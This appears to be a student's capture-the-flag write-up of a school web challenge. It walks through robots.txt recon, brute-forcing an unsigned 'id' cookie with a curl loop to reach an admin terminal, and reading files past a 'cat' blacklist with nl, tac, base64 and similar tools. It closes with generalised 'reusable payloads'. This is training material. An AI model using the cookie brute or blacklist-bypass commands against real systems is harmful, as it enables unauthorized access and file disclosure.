# [School CTF] Internal Debug Terminal (Web · first WEB solve)

- **Platform**: School CTF ctf.npusec.org.cn:10275 (Cybersecurity Culture Festival portal)
- **Challenge URL**: http://ctf.npusec.org.cn:10275/
- **Difficulty**: Beginner
- **Category**: Web (info leak + privilege escalation + command filter bypass + source disclosure)
- **Date solved**: 2026-09-24
- **Time**: ~40 min
- **Official name/points**: TBD

## Description

> Campus Cybersecurity Culture Festival portal (gunicorn/Flask), with login/register and a "Fun Cryptography Contest" section (login required).

## Solution

### 1. Reconnaissance

An HTML comment on the homepage pointed to robots.txt:

```text
GET /robots.txt →
User-agent: *
Disallow: /admin_page
```

`/admin_page` directly → **403** "You are not an administrator".

Response header `Server: gunicorn` → Python Flask stack.

### 2. Login recon

- Registered/login form: `username` + `password`
- Logged in with `admin / admin1` → `302 /dashboard`
- **Key response**:

```http
Set-Cookie: id=0; Path=/
```

The identity credential is a **raw unsigned `id` integer** (a proper Flask session cookie would be a signed `eyJ...` blob) → attack surface exposed.

### 3. Key breakthrough: cookie tampering

`id=0` (the admin we logged in as) still got 403 → a higher-privileged account exists. No signature → brute the value:

```bash
for i in 0 1 2 3 4 5; do
  echo -n "id=$i => "
  curl -s -o /dev/null -w "%{http_code}" http://ctf.npusec.org.cn:10275/admin_page -b "id=$i"
  echo
done
# id=0 => 403 / id=1 => 200 / id=2~5 => 403
```

**`id=1` = the site founder. 200, we're in.**

Browser reproduction: login → F12 → Application → Cookies → change `id` to `1` → reload `/admin_page`.

### 4. Debug terminal: bypassing the cat ban

`/admin_page` is an "Internal Debug Terminal" (fake shell with an input form):

```text
$ ls -l
src  static  template            ← site root

$ ls -l src
app.py (7999B)  config.py (1117B)  data/

$ cat ...
→ cat is disabled
```

**Pitfall 1 (paths)**: the prompt shows only `$`, no cwd; every command runs from the site root — `nl config.py` / `ls data` all fail. Must prefix: `nl src/config.py`.

**Pitfall 2 (cat banned)**: a blacklist bans one program, but there's a whole squad of file readers: `nl` / `tac` / `head` / `more` / `grep .` / `awk` / `base64`. `nl` wins:

```text
$ nl src/config.py
 5  # real flag written to server root as flaaag.txt (three a's, on purpose)
10  FLAG_FILE_PATH = '/flaaag.txt'
15  BLOCKED_COMMANDS = ['cat']            # word-boundary match, case-insensitive
20  ADMIN_INITIAL_PASSWORD = 'NOtTheP4ssw0rd!'   # intended path is cookie tampering, not bruteforce
```

The source confessed everything: flag lives at `/flaaag.txt` (three a's — defeating `flag*` wildcards).

### 5. Flag

```text
$ nl /flaaag.txt
flag{82ec20b5-0f23-4018-91d6-6ec6a3805385}
```

> ⚠️ Trap note: `config.py` also contains `FLAG = 'flag{We1c0m2_7o_w2b_w0r1d}'` — that's the **source-code default**. The real flag is the UUID written into `/flaaag.txt` at deployment. Submit the UUID.

## Knowledge points

- robots.txt information disclosure (Disallow = a "dig here" list)
- Privilege escalation via **unsigned cookie tampering** (F12 makes it zero-tooling)
- Command blacklist bypass: same-function substitutes (cat→nl/tac/head/grep/awk/base64)
- Source disclosure triage: read the small config file first (1KB config.py > 8KB app.py for intel density)

## Reflections

- Fake shell prompt hides cwd → relative paths break. Lesson: **`ls` first to find the anchor, then always use full paths**
- First instinct on a cat ban was string mutation (`ca''t`); `nl` just works — try "another program with the same job" before "mutate the same program"

## Reusable payloads

```bash
# Unsigned-cookie privilege brute (curl)
for i in 0 1 2 3 4 5; do echo -n "id=$i => "; curl -s -o /dev/null -w "%{http_code}\n" http://TARGET/admin_page -b "id=$i"; done

# cat-banned file reading ladder
nl file   tac file   head file   more file   grep . file   awk '{print}' file   base64 file
```

## 📸 Screenshot slots

| # | Content | Filename | Done |
|:---:|:---|:---|:---:|
| 1 | robots.txt showing /admin_page | 01_robots.png | ⬜ |
| 2 | 403 forbidden page | 02_403.png | ⬜ |
| 3 | F12 cookie edit id=1 | 03_cookie.png | ⬜ |
| 4 | nl src/config.py output (QQ screenshot exists) | 04_config.png | ⬜ |
| 5 | nl /flaaag.txt printing flag | 05_flag.png | ⬜ |
